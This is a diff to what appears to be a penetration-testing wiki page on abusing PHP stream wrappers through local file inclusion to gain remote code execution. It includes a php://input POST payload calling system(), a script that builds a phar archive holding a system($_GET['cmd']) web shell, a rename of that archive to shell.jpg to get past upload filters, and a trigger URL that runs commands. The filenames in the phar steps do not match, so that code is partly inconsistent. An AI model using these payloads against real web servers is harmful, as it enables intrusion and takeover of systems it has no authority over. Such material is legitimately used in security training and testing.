@@ -2,7 +2,7 @@
 
 ## Theory
 
-PHP comes with many built-in wrappers for various URL-style protocols that we can abuse and include with LFI
+PHP comes with a number of built-in wrappers for various URL-type protocols that we can abuse with an LFI to obtain arbitrary code execution
 
 ## Practice
 
@@ -57,6 +57,21 @@ NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
 
 <details>
 
+<summary>php://input</summary>
+
+Note that this wrapper is restricted by php configurations (php.ini file). **`allow_url_fopen`** and **`allow_url_include`** attributes must be set.
+
+Specify your payload in the POST parameters
+
+```
+http://example.com/index.php?page=php://input
+POST DATA: <?php system('id'); ?>
+```
+
+</details>
+
+<details>
+
 <summary>php://filter  (Filter chain)</summary>
 
 PHP filters chain can be used to get a RCE without uploading a file if we control entirely the parameter passed to a `require` or an `include` in PHP!
@@ -98,15 +113,38 @@ http://example.com/index.php?page=expect://ls
 
 <details>
 
-<summary>php://input</summary>
+<summary>phar://</summary>
 
-Note that this wrapper is restricted by php configurations (php.ini file). **`allow_url_fopen`** and **`allow_url_include`** attributes must be set.
+In order to use this method, you should be able **to upload a file**.
 
-Specify your payload in the POST parameters
+**Phar** files (PHP Archive) files **contain meta data in serialized format**, so, when parsed, this **metadata** is **deserialized** and you can try to abuse a **deserialization** vulnerability inside the **PHP** code.
+
+this deserialization will occur even using PHP functions that do not eval PHP code like **file\_get\_contents(), fopen(), file() or file\_exists(), md5\_file(), filemtime() or filesize()**.
+
+Let's create a phar file
+
+{% code title="create_phar.php" %}
+```php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+//We can add JPG magic bytes
+//$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$phar->stopBuffering();
+```
+{% endcode %}
+
+```bash
+#Compile it into a .phar that when called would write a shell called shell.txt
+php --define phar.readonly=0 create_phar.php && mv create_phar.phar shell.jpg
+```
+
+Now that we have a phar file named `shell.jpg`, once uploaded we can trigger it like this
 
 ```
-http://example.com/index.php?page=php://input
-POST DATA: <?php system('id'); ?>
+http://example.com/index.php?page=phar://./shell.jpg%2Fshell.txt&cmd=id"
 ```
 
 </details>
